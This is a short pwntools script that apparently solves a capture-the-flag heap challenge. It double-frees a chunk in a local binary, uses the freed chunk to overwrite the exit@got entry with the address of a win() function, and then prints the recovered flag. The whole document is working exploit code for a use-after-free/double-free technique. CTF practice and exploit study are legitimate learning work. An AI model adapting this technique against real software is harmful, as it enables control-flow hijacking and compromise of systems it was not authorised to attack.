#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./bin")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"size : ", str(size).encode())
    shell.sendlineafter(b"data : ", data)

def free(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"index : ", str(index).encode())

def exit():
    shell.sendlineafter(b"> ", b"3")

malloc(24, b"A" * 8)

free(0)
free(0)

malloc(24, p64(0x404070)) # exit@got
malloc(24, b"B" * 8)
malloc(24, p64(0x401296)) # win()

exit()

flag = shell.recvline_contains(b"flag").decode()[7:]
log.info(f"Flag: {flag}")
